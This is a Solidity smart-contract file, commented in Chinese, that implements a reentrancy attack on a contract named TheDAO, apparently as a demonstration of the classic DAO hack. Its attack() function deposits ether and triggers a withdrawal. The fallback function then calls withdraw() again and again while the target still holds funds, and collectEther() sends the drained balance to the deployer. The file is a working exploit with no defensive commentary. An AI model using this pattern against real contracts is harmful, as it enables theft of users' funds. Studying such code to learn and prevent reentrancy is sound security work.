// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./TheDAO.sol";

contract TheDAOAttacker {
    TheDAO public theDAO;
    address payable owner;

    constructor(address theDAOAddress) {
        theDAO = TheDAO(theDAOAddress);
        owner = payable(msg.sender);
    }

    function attack() external payable {
        // 将一些以太币存入 TheDAO 合约
        theDAO.deposit{value: msg.value}();

        // 触发提款，这将再次调用本合约的回退函数
        theDAO.withdraw();
    }

    // 回退函数，它会在 TheDAO 合约试图将以太币发送回本合约时被调用
    fallback() external payable {
        if (address(theDAO).balance >= msg.value) {
            theDAO.withdraw();
        }
    }

    // 收回攻击获得的以太币
    function collectEther() external {
        owner.transfer(address(this).balance);
    }

    // 仅接收以太币的 receive 函数
    receive() external payable {
        // 这个函数是空的，仅用于接收以太币
    }
}